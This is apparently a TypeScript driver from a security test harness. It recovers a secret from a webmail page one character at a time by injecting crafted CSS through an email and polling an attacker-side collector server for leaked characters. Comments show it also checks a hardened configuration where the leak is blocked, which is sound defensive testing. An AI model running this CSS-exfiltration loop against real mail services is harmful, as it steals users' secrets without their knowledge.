import type { Page } from "playwright";
import { buildRoundCss } from "./css.js";

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

async function postJson(url: string, body: unknown): Promise<void> {
  await fetch(url, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
}

// Poll the collector for the character that fired at this position. Returns the
// character, or null if nothing arrives within the timeout (expected in the
// hardened run, where the leak is blocked).
async function readLeakedChar(
  collectorUrl: string,
  phase: string,
  pos: number,
  timeoutMs: number,
): Promise<string | null> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const res = await fetch(`${collectorUrl}/events?phase=${phase}&pos=${pos}`);
    const { chars } = (await res.json()) as { chars: string[] };
    if (chars.length > 0) return chars[0];
    await sleep(100);
  }
  return null;
}

interface RecoverOpts {
  page: Page;
  webmailUrl: string;
  collectorUrl: string;
  phase: string;
  alphabet: string;
  length: number;
}

export async function recover(opts: RecoverOpts): Promise<string> {
  const { page, webmailUrl, collectorUrl, phase, alphabet, length } = opts;
  await postJson(`${collectorUrl}/reset`, { phase });

  let prefix = "";
  for (let pos = 0; pos < length; pos++) {
    const css = buildRoundCss({ phase, pos, prefix, alphabet, collectorUrl });
    await postJson(`${webmailUrl}/email`, { css });
    await page.goto(`${webmailUrl}/message`, { waitUntil: "networkidle" });

    const c = await readLeakedChar(collectorUrl, phase, pos, 3000);
    if (c === null) break; // nothing leaked: hardened run, or end of secret
    prefix += c;
  }
  return prefix;
}
